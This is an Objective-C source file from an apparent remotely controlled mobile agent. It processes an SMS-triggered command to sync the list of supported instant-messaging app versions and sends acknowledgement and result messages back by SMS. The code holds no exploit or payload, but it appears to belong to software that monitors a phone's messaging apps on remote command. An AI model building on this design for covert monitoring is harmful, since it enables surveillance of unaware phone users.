//
//  SyncSupportedIMVersionProcessor.m
//  RCM
//
//  Created by Ophat Phuetkasickonphasutha on 8/14/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SyncSupportedIMVersionProcessor.h"
#import "IMVersionControlManager.h"

@interface SyncSupportedIMVersionProcessor (PrivateAPI)
- (void) processToGetListOfSupportedIM;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation SyncSupportedIMVersionProcessor


- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncSupportedIMVersionProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}
- (void) doProcessingCommand {
	DLog (@"SyncSupportedIMVersionProcessor--->doProcessingCommand")
	[self processToGetListOfSupportedIM];
}
#pragma mark #------------- OnWaiting
- (void) processToGetListOfSupportedIM{
	id <IMVersionControlManager> imVersionControlManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mIMVersionControlManager];
	[imVersionControlManager requestForIMVersionList:self];
	
	// On waiting
	[self acknowldgeMessage];
}
- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage= [messageFormat stringByAppendingString:NSLocalizedString(@"kSetIMVersionControlWait", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

#pragma mark #------------- END

#pragma mark #------------- OnComplete and sendReplySMS
-(void)IMVersionControlRequireForIMVersionListCompleted: (NSError *) aError{
	DLog (@"IMVersionControlRequire --> IMVersionControlRequireForIMVersionListCompleted")
	NSString *softwareUpdateMessage	= nil;
	if (!aError) {
		// On success
		DLog (@">> success to MVersionControlRequire")
		NSString *messageFormat		= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							   andErrorCode:_SUCCESS_];
		softwareUpdateMessage		= [messageFormat stringByAppendingString:NSLocalizedString(@"kSetIMVersionControlSuccess", @"")];	
	} else {
		// On error
		DLog (@">> fail to IMVersionControlRequire with error %@", aError)
		NSInteger errorCode = [aError code];

		NSString *messageFormat		= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							   andErrorCode:errorCode];	
		softwareUpdateMessage		= messageFormat;
	}
	
	[self sendReplySMS:softwareUpdateMessage isProcessCompleted:YES];	
}
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"IMVersionControlRequire ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	DLog (@"recipientNumber %@", [self recipientNumber])
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent acknowldge message.")
	}
}
-(void) processFinished {
	DLog (@"IMVersionControlRequire ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}
#pragma mark #------------- END

-(void) dealloc {
	DLog (@"SyncSupportedIMVersionProcessor is now dealloced")
	[super dealloc];
}
@end
